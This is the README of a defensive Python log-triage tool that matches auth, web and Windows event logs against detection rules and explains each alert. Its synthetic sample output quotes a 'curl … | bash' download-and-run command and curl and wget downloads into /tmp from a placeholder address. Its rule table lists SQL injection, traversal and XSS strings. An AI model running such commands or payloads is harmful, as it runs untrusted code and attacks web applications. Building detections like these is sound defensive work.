# soclog

[![CI](https://github.com/Lawrence-Flash/soc-log-analyser/actions/workflows/ci.yml/badge.svg)](https://github.com/Lawrence-Flash/soc-log-analyser/actions/workflows/ci.yml)

Offline command-line triage for Linux auth logs, Apache/Nginx combined access logs, and Windows Security events. It is a single-host helper for a junior analyst: it parses a file, runs the rules in `soclog/rules.json`, and prints what matched. It is not a SIEM.

No packages to install and no network calls. Python 3.10 or newer is enough.

## What it does

`python3 -m soclog analyse <file>` reads one log. The format is detected, or you can pass `--format auto|linux-auth|web-access|windows-json|windows-csv`.

Parsed sources:

- Linux `auth.log` / `secure`: sshd failed and accepted passwords, sudo `COMMAND=`, `useradd` / `adduser`, and `usermod` group changes
- Apache or Nginx combined access logs (host, time, request, status, referrer, user agent)
- Windows Security events `4624`, `4625`, `4720`, `4728`, `4732`, `4756`, `4688`, and `1102`, as a JSON list, a wrapper object, newline-delimited JSON, or CSV

Each alert has an id, title, severity, MITRE ATT&CK technique id and name, time range, source IP and user when the line has them, evidence lines, and a plain-English "what to do next".

Output is a terminal summary (colour only when stdout is a terminal and `NO_COLOR` is unset), `--json` for a machine-readable document, or `--report` for Markdown with a summary table, a timeline, per-alert detail, and the ATT&CK techniques seen.

The process exits `1` when any alert is at or above `--min-severity` (default `low`), and `0` when nothing meets that bar. Exit `2` means the file or the rules could not be read. A CI job can treat `1` as "the rules fired" rather than "the tool crashed".

`python3 -m soclog demo` runs the four synthetic files in `samples/`.

## Quick start

```bash
git clone https://github.com/Lawrence-Flash/soc-log-analyser.git
cd soc-log-analyser
python3 -m soclog demo
python3 -m soclog analyse samples/linux-auth.log
python3 -m soclog analyse samples/web-access.log --min-severity high --report /tmp/web.md
python3 -m soclog analyse samples/windows-security.json --json
python3 -m unittest discover -s tests -v
```

The samples are fake. Addresses are the documentation ranges from RFC 5737 (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`). Account names are roles. See `samples/README.md`.

`demo` on these files exits `1` and prints 24 alerts. A report checked into the repo is at `docs/example-report.md` (from `python3 -m soclog demo --report docs/example-report.md`).

## Example output

This is the real stdout of `python3 -m soclog analyse samples/linux-auth.log` (exit code 1). The daytime `deploy` login, the single mistyped password, and `systemctl status nginx` are in that file and do not appear below.

```
soclog 0.1.0
minimum severity: low

source: samples/linux-auth.log
format: linux-auth
events: 30
unparsed lines: 0
alerts: 9 (low 1, medium 1, high 6, critical 1)

SOC-001  high  Repeated failed logons for root from 203.0.113.10
  rule:       auth-brute-force
  ATT&CK:     T1110.001 Brute Force: Password Guessing
  when:       2026-10-27 14:00:00Z–14:00:50Z
  source IP:  203.0.113.10
  user:       root
  events:     6
  next:       Check whether this account exists and whether the source is a scanner or someone who should be logging in. Five failures in ten minutes is only a threshold: a mistyped password can look the same. If the source is not recognised, block it and see whether a successful logon followed.
  evidence:
    | 2026-10-27T14:00:00Z web01 sshd[1601]: Failed password for root from 203.0.113.10 port 41001 ssh2
    | 2026-10-27T14:00:40Z web01 sshd[1605]: Failed password for root from 203.0.113.10 port 41005 ssh2
    | 2026-10-27T14:00:50Z web01 sshd[1606]: Failed password for root from 203.0.113.10 port 41006 ssh2
    | … 3 more event(s) not shown here

SOC-002  high  Password spraying from 203.0.113.20 against 6 accounts
  rule:       password-spray
  ATT&CK:     T1110.003 Brute Force: Password Spraying
  when:       2026-10-27 15:00:00Z–15:00:50Z
  source IP:  203.0.113.20
  user:       alpha, bravo, charlie, delta, echo, foxtrot
  events:     6
  next:       One source tried a small number of passwords against several accounts. Compare the account list with people who work here before locking accounts. If the source is not a known gateway or VPN, block it and look for a later success from the same address.
  evidence:
    | 2026-10-27T15:00:00Z web01 sshd[1701]: Failed password for invalid user alpha from 203.0.113.20 port 42001 ssh2
    | 2026-10-27T15:00:40Z web01 sshd[1705]: Failed password for invalid user echo from 203.0.113.20 port 42005 ssh2
    | 2026-10-27T15:00:50Z web01 sshd[1706]: Failed password for invalid user foxtrot from 203.0.113.20 port 42006 ssh2
    | … 3 more event(s) not shown here

SOC-003  critical  Successful logon for admin from 203.0.113.30 after repeated failures
  rule:       success-after-failures
  ATT&CK:     T1110.001 Brute Force: Password Guessing
  when:       2026-10-27 16:40:00Z–16:41:10Z
  source IP:  203.0.113.30
  user:       admin
  events:     7
  next:       A logon succeeded after repeated failures from the same source. Treat that session as untrusted until someone confirms it was expected. Reset the password for the account that got in, review what it did next, and block the source if you do not recognise it. If many different accounts failed first, this fits password spraying (T1110.003) rather than guessing against one account (T1110.001).
  evidence:
    | 2026-10-27T16:40:00Z web01 sshd[1801]: Failed password for admin from 203.0.113.30 port 43001 ssh2
    | 2026-10-27T16:40:50Z web01 sshd[1806]: Failed password for admin from 203.0.113.30 port 43006 ssh2
    | 2026-10-27T16:41:10Z web01 sshd[1807]: Accepted password for admin from 203.0.113.30 port 43007 ssh2
    | … 4 more event(s) not shown here

SOC-004  medium  Local account svcbackup was created
  rule:       local-user-created
  ATT&CK:     T1136.001 Create Account: Local Account
  when:       2026-10-27T18:00:00Z
  source IP:  -
  user:       svcbackup
  events:     1
  next:       A local account was created with useradd or adduser. Confirm there is a change ticket and that the account is not an extra administrator. If nobody expected it, disable the account and look for the process that created it.
  evidence:
    | 2026-10-27T18:00:00Z web01 useradd[3101]: new user: name=svcbackup, UID=1007, GID=1007, home=/home/svcbackup, shell=/bin/bash

SOC-005  high  svcbackup was added to sudo
  rule:       privileged-group-add
  ATT&CK:     T1098.007 Account Manipulation: Additional Local or Domain Groups
  when:       2026-10-27T18:00:05Z
  source IP:  -
  user:       svcbackup
  events:     1
  next:       This account was added to a group that can administer the host or the domain (sudo, wheel, Administrators, Domain Admins, and similar). Confirm the change was requested. If it was not, remove the membership and review other actions by the account that made the change. Adding someone to an ordinary group such as Users does not raise this alert.
  evidence:
    | 2026-10-27T18:00:05Z web01 usermod[3102]: add 'svcbackup' to group 'sudo'

SOC-006  high  Shell command piped from curl or wget for www-data
  rule:       shell-pipe-download
  ATT&CK:     T1059.004 Command and Scripting Interpreter: Unix Shell
  when:       2026-10-27T18:05:00Z
  source IP:  -
  user:       www-data
  events:     1
  next:       A command downloads content and pipes it into a shell. That runs whatever the URL returns. Find which account did it and what changed afterwards. If you do not recognise the URL, isolate the host. This is mapped to Unix shell (T1059.004), not PowerShell, because the pipe targets sh or bash.
  evidence:
    | 2026-10-27T18:05:00Z web01 sudo[3200]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -fsSL http://203.0.113.80/setup.sh | bash

SOC-007  high  wget wrote a file under /tmp for www-data
  rule:       wget-to-tmp
  ATT&CK:     T1105 Ingress Tool Transfer
  when:       2026-10-27T18:06:00Z
  source IP:  -
  user:       www-data
  events:     1
  next:       wget was told to save a file under /tmp. wget is a normal admin tool, so check the URL and who ran it. If you do not recognise the URL, quarantine the file and do not execute it. This program does not contact the URL.
  evidence:
    | 2026-10-27T18:06:00Z web01 sudo[3201]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -O /tmp/setup.sh http://203.0.113.80/setup.sh

SOC-008  high  curl wrote a file under /tmp for www-data
  rule:       curl-to-tmp
  ATT&CK:     T1105 Ingress Tool Transfer
  when:       2026-10-27T18:07:00Z
  source IP:  -
  user:       www-data
  events:     1
  next:       curl was told to save a file under /tmp. Check the URL and the account. A download into /tmp from an address you do not recognise is worth quarantining. This program does not contact the URL.
  evidence:
    | 2026-10-27T18:07:00Z web01 sudo[3202]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/stage.bin http://203.0.113.80/stage.bin

SOC-009  low  Successful logon for ops from 198.51.100.40 during unusual hours
  rule:       unusual-hours
  ATT&CK:     T1078 Valid Accounts
  when:       2026-10-27T23:40:00Z
  source IP:  198.51.100.40
  user:       ops
  events:     1
  next:       This logon falls between 22:00 and 05:00 UTC, about 00:00 to 07:00 in South Africa (SAST, UTC+2, no daylight saving). The tool does not know this account's normal hours. Ask whether this person or job is supposed to authenticate then. On its own this is not evidence of compromise. Mapping it to T1078 only means an existing account was used.
  evidence:
    | 2026-10-27T23:40:00Z web01 sshd[1901]: Accepted password for ops from 198.51.100.40 port 44010 ssh2

total alerts: 9
```

`python3 -m soclog demo` prints the same kind of block for each sample. The run that produced `docs/example-report.md` reported:

```
source: samples/linux-auth.log
format: linux-auth
events: 30
unparsed lines: 0
alerts: 9 (low 1, medium 1, high 6, critical 1)

source: samples/web-access.log
format: web-access
events: 29
unparsed lines: 0
alerts: 5 (low 0, medium 2, high 3, critical 0)

source: samples/windows-security.json
format: windows-json
events: 18
unparsed lines: 0
alerts: 8 (low 1, medium 1, high 4, critical 2)

source: samples/windows-security.csv
format: windows-csv
events: 9
unparsed lines: 0
alerts: 2 (low 0, medium 1, high 1, critical 0)

total alerts: 24
```

## Detections

Thresholds live in `soclog/rules.json`. "Window" is the maximum span of one cluster.

| Rule | What it matches | Default | Severity | ATT&CK |
| --- | --- | --- | --- | --- |
| `auth-brute-force` | SSH or Windows logon failures for one account from one IP | 5 failures in 600s | high | T1110.001 Brute Force: Password Guessing |
| `password-spray` | One IP, several accounts, few failures each | 5 accounts, at most 4 failures each, in 600s | high | T1110.003 Brute Force: Password Spraying |
| `success-after-failures` | A success from an IP that just failed enough times. Uses T1110.003 when those failures were a spray | 5 failures in the previous 600s | critical | T1110.001 Brute Force: Password Guessing, or T1110.003 Brute Force: Password Spraying |
| `unusual-hours` | A successful SSH or Windows logon between 22:00 and 05:00 UTC (about 00:00–07:00 SAST) | fixed clock, not a per-user baseline | low | T1078 Valid Accounts |
| `local-user-created` | Linux `useradd` / `adduser` | one event | medium | T1136.001 Create Account: Local Account |
| `windows-user-created` | Windows event 4720. Local and domain accounts share this event, so the parent technique is used | one event | medium | T1136 Create Account |
| `privileged-group-add` | `usermod` or events 4728 / 4732 / 4756 into sudo, wheel, admin, root, Administrators, Domain Admins, Enterprise Admins, or Schema Admins | one event | high | T1098.007 Account Manipulation: Additional Local or Domain Groups |
| `audit-log-cleared` | Windows event 1102 | one event | critical | T1070.001 Indicator Removal: Clear Windows Event Logs |
| `encoded-powershell` | `-EncodedCommand`, `-enc` plus a base64 blob, or `FromBase64String` | one command line | high | T1059.001 Command and Scripting Interpreter: PowerShell |
| `shell-pipe-download` | `curl` or `wget` piped into `sh` or `bash` | one command line | high | T1059.004 Command and Scripting Interpreter: Unix Shell |
| `wget-to-tmp` | `wget -O /tmp/...` | one command line | high | T1105 Ingress Tool Transfer |
| `curl-to-tmp` | `curl -o /tmp/...` or `curl --output /tmp/...` | one command line | high | T1105 Ingress Tool Transfer |
| `certutil-download` | `certutil -urlcache` (not `certutil -hashfile`) | one command line | high | T1105 Ingress Tool Transfer |
| `powershell-download` | `DownloadString`, `DownloadFile`, or `Invoke-WebRequest -OutFile` | one command line | high | T1105 Ingress Tool Transfer |
| `web-sqli` | `UNION SELECT`, `' OR`, `information_schema`, `sleep(`, `benchmark(` in the request path | one request, grouped by IP | high | T1190 Exploit Public-Facing Application |
| `web-traversal` | `../`, encoded `..`, `/etc/passwd`, `win.ini` | one request, grouped by IP | high | T1190 Exploit Public-Facing Application |
| `web-xss` | `<script`, `javascript:`, `onerror=`, `onload=` | one request, grouped by IP | high | T1190 Exploit Public-Facing Application |
| `web-scanner-ua` | User agents such as sqlmap, Nikto, Nmap, Nuclei, gobuster | grouped by IP within 600s | medium | T1595.002 Active Scanning: Vulnerability Scanning |
| `web-404-burst` | Many HTTP 404s from one client | 12 responses in 300s | medium | T1595.003 Active Scanning: Wordlist Scanning |

A plain brute-force or spray alert is hidden when a `success-after-failures` alert already covers that IP and the same time span. The success alert is the one to act on. Adding an account to a normal group such as `Users` does not match `privileged-group-add`.

Technique names are the current MITRE ATT&CK names for those ids. Sub-techniques are used where the log actually supports them. Event 4720 does not say whether the account is local (T1136.001) or domain (T1136.002), so that rule stays on T1136.

## How to add a rule

Pattern rules are data. Correlation rules are code plus data.

1. Open `soclog/rules.json`.
2. To flag a new URI, user agent, or command string, copy a rule whose `type` is `regex`. Set `id`, `title`, `severity`, `mitre_id`, `mitre_name`, `event_types`, `fields` (`command`, `path`, `user_agent`, or `raw`), `pattern`, and `recommendation`. A bad regular expression is rejected at startup with the rule id.
3. To change how many failures count as guessing or spraying, edit `threshold`, `window_seconds`, `min_distinct`, or `max_per_value` on the existing rule. The types `count_threshold`, `distinct_threshold`, `success_after_failures`, `unusual_hours`, and `match` are implemented in `soclog/engine.py`.
4. A new kind of correlation, something other than a count, a distinct-value count, a regex, or the handlers already in that file, needs a short handler in `engine.py` and a rule entry. The JSON file cannot invent a new correlation by itself.
5. Add a positive and a negative unittest in `tests/test_detections.py`. Run `python3 -m unittest discover -s tests -v`.

Set `"enabled": false` on a rule to keep it in the file without firing it.

## Limitations

This is not a SIEM. It does not store logs, build a baseline per user, join hosts over days, or open tickets.

- The default thresholds were chosen so the synthetic samples fire and a single mistyped password does not. They are not tuned on a real network. A number that looks right here can be noisy or blind somewhere else.
- Unusual hours are a fixed UTC window (22:00 inclusive to 05:00 exclusive). That is about 00:00–07:00 in South Africa (SAST, UTC+2, no daylight saving). The tool does not know who works nights. T1078 on that alert only means an existing account authenticated.
- Traditional syslog has no year. The parser uses the current year, or the previous year if the timestamp would otherwise be more than a day in the future. Samples in this repo use ISO timestamps so the year is in the line.
- Windows logon events with type 4 (batch) or 5 (service) are ignored, as are `SYSTEM`, `LOCAL SERVICE`, `NETWORK SERVICE`, `ANONYMOUS LOGON`, and account names ending in `$`. If the export omits logon type, the event is kept.
- Brute force and spraying need a source IP. `-`, loopback, and empty addresses are not grouped together, or one host's local noise would look like one attacker.
- Event 4688 only helps when command-line auditing is on. A process name alone rarely matches the command rules.
- Access logs must be the combined format. A common log line (no referrer or user agent) is counted as unparsed.
- Web and command rules are regular expressions. They miss obfuscation they do not list, and a harmless string can look like a hit. Check the evidence before treating it as an exploit.
- Nothing is enriched. The program does not resolve IPs, call a threat-intel API, or decode and run a script.
- Exit code 1 means the rules fired at the severity you asked for. It does not mean an incident is real.
- Files are analysed separately. An IP that shows up in the auth log and the access log becomes two alerts, not one incident.

## What I learned

I built this so I could show detection work in a terminal, which is the tool I actually want to use. I have not run it against a production SOC, and the logs in `samples/` are written by hand.

Most of the time went into the parsers, not the rules. Linux auth lines often have no year. A Windows export might be a JSON list, one object per line, or a CSV whose column names change with the tool that wrote it. Event 4732 does not use the same field for the new member and the group in every export. I count lines I cannot parse instead of stopping the run, so a wrong `--format` is visible.

The brute-force number is a guess. Five failures in ten minutes fires on the sample and stays quiet for the one bad password I put next to a normal login. This repository has no real network's logs to tune that against. I would rather say the threshold is a starting point than pretend the default is correct.

Writing the ATT&CK id next to each alert made me separate behaviours that look similar in a list of "bad logons". Repeated passwords against one account are T1110.001. A few tries across many accounts are T1110.003. A success after those failures is still that technique: MITRE's own detection note for password guessing is repeated failures followed by a possible success, so I did not invent a second technique for the success. `useradd` is a local account, T1136.001. Windows 4720 does not tell me local versus domain, so that rule stays on T1136. Clearing the Security log is T1070.001. Encoded PowerShell is T1059.001. `curl | bash` is a Unix shell, T1059.004, and I did not force it into the PowerShell id. `certutil -urlcache` and a download into `/tmp` are T1105, which is where MITRE lists those tools. A SQL injection or traversal string is T1190. A scanner user agent is reconnaissance, T1595.002, and a burst of 404s is wordlist scanning, T1595.003. Those are not the same as a successful exploit.

The unusual-hours rule is the one I trust least. It is a clock. I mapped it to T1078 only because an existing account was used, and the alert says not to treat that as proof.

I stayed on the Python standard library so anyone can run it with `python3` and no API key. The cost of that choice is that the tool cannot look up an address or learn what normal is. That is why it triages a file and does not replace a SIEM.

## Tests

```bash
python3 -m unittest discover -s tests -v
```

GitHub Actions runs that on Python 3.10, 3.11, and 3.12, then runs `python3 -m soclog demo`. CodeQL analyses the Python, and Dependabot watches the Actions workflows.

## License

[MIT](LICENSE). Copyright 2026 Lawrence Tshabalala.
